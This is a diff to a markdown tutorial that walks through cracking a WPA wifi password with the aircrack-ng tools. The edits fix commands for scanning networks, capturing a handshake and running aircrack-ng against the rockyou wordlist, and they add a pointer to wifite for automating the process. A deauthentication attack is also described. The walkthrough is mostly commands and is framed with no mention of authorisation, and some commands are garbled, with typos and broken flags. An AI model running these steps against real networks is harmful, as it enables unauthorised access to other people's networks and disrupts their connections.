@@ -159,14 +159,13 @@ sudo airmon-ng start wlan0
 
 - We scan for the wifi networks.
 ```bash
-sudo airmon-ng check kill
+sudo airodump-ng wlan0mon
 ```
 
 - Save the BSSID and Channel and ESSID
 - Now we can create a file and capture 802.11 frames that were captured to a file.
 ```bash
-sudo
-airodump-ng –w captures – bssid <MAC Address> wlan0
+sudo  airodump-ng –w captures – bssid <MAC Address> wlan0
 ```
 - Now we will create a deauth attack to the wifi network and then we will try to connect to the network with another device to capture the handshake
 
@@ -190,6 +189,8 @@ sude airmon-ng stop wlan0
 ```bash
 sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt
 ```
+
+- You can also use the program **wifite** to do all of this in one command.
 
 
 
